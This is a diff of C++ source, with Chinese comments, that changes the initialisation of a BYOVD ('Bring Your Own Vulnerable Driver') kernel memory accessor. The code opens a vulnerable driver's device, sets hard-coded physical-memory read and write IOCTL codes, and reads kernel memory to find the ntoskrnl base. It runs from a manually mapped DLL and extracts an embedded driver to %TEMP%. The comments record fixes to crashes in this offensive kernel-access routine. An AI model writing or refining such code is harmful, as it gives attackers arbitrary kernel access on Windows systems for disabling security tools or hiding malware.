@@ -1373,11 +1373,11 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     }
     ByovdDiag("BYOVD:Init: HVCI check done\n");
 
-    // ★ BUILD 473: 优先复用已有驱动 — 在 stale service 清理之前
-    //   BUILD 472 在卸载旧服务调用 NtUnloadDriver 时崩溃 (手动映射 DLL 上下文),
-    //   根本原因: 驱动已由之前 session 加载, 应直接复用跳过所有清理.
-    //   此前置 probe 执行 0 次清理, 消除崩溃源.
-    ByovdDiag("BYOVD:Init: BUILD 473 early probe for %ls...\n",
+    // ★ BUILD 474: 优先复用已有驱动 — 在 stale service 清理之前
+    //   - BUILD 472/473 在调用 NtUnloadDriver 时崩溃 (手动映射 DLL 上下文)
+    //   - 修复: 先设置 IOCTL 码再 ReadKernelVA (BUILD 473 漏了这一步)
+    //   - 修复: 即使 early probe 失败, 也不 fallthrough 到 stale 清理 — 跳过 NtUnloadDriver
+    ByovdDiag("BYOVD:Init: BUILD 474 early probe for %ls...\n",
         m_driverInfo.devicePath.c_str());
 
     m_hDevice = CreateFileW(m_driverInfo.devicePath.c_str(),
@@ -1386,8 +1386,11 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
         nullptr, OPEN_EXISTING, 0, nullptr);
 
     if (m_hDevice != INVALID_HANDLE_VALUE) {
-        ByovdDiag("BYOVD:Init: early probe opened, testing IOCTL 0x%08X...\n",
-            m_driverInfo.ioctlCode);
+        ByovdDiag("BYOVD:Init: early probe opened, setting IOCTL + testing...\n");
+        // ★ BUILD 474: 先设置 IOCTL 码 (BUILD 473 漏了这一步, 导致 ReadKernelVA 用 ioctl=0)
+        g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
+        g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
+
         m_active = true;
         m_ntosBase = GetNtoskrnlBase();
         if (m_ntosBase) {
@@ -1398,14 +1401,17 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
                     (unsigned long long)m_ntosBase);
                 return true;
             }
-            ByovdDiag("BYOVD:Init: early probe IOCTL FAIL (magic=0x%04X), continue to load\n", magic);
+            ByovdDiag("BYOVD:Init: early probe IOCTL FAIL (magic=0x%04X), device=zombie\n", magic);
         }
         CloseHandle(m_hDevice);
         m_hDevice = INVALID_HANDLE_VALUE;
         m_active = false;
-    } else {
-        ByovdDiag("BYOVD:Init: early probe no device (err=%u), will load fresh\n", GetLastError());
+        // ★ BUILD 474: device 存在但 IOCTL 失败 → 僵尸设备
+        //   不 fallthrough — 跳过 stale 清理和加载, 直接让调用方处理
+        ByovdDiag("BYOVD:Init: zombie device detected, aborting (not calling UnloadDriver)\n");
+        return false;
     }
+    ByovdDiag("BYOVD:Init: early probe no device (err=%u), will load fresh\n", GetLastError());
 
     // 2. 确保驱动文件存在 (System32\drivers → 嵌入提取到 %TEMP%)
     ByovdDiag("BYOVD:Init: calling EnsureDriverFile('%ls')...\n", driver.driverPath.c_str());
